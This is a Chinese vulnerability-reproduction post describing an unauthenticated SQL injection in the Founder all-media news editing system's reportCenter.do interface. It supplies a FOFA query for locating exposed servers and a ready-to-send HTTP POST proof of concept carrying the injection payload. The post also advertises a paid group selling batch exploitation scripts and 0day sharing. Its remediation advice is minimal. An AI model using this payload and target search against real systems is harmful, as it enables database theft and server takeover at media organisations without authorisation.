#  「漏洞复现」方正畅享全媒体新闻采编系统 reportCenter.do SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-24 05:57  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
方正畅享全媒体新闻生产系统是以内容资产为核心的智能化融合媒体业务平台，融合了报、网、端、微、自媒体分发平台等全渠道内容。该平台由协调指挥调度、数据资源聚合、融合生产、全渠道发布、智能传播分析、融合考核等多个平台组成，贯穿新闻生产策、采、编、发、存、传、评、营的每个环节, 涵盖桌面端、移动端（超融合掌上编辑部）、大屏端三端联动进行编采业务支撑。平台通过大数据+AI的赋能，助力融媒体在内容生产、数据资产、报道指挥、绩效考核等业务环节。  
  
0x03  
  
漏洞威胁  
  
方正畅享全媒体新闻采编系统 reportCenter.do 接口处存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
app="FOUNDER-全媒体采编系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozGf5EnlhsS23md8hABHQmqTqWATVYJfAqibqy5z074b09ADo45HcHaGbicCChmreVl74K8pXb7NzQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /newsedit/report/reportCenter.do HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozGf5EnlhsS23md8hABHQmoicj0SAOZmvjoib9QvIoNhibSzbHNLkxpBboia89oKUWnibUwtOXn85thhQ/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozGf5EnlhsS23md8hABHQmFkCglOJKhBgC8IXI0G7PWe2NlkwNFo8dKibiaKsVRpm3NKFqZG55OUXw/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本   
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0ozGf5EnlhsS23md8hABHQm9XorCsYAicmfR5J54DF2xz9hkaeJNGGias3hZ1gl0hBHqwibtoHqIJg6Q/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0ozGf5EnlhsS23md8hABHQmtTeEHSkHGB5ArQLacCQz0tdflNubTLMkC3X0Y2DsHKCDltib2nAXXUQ/640?wx_fmt=gif&from=appmsg "")  
  
  
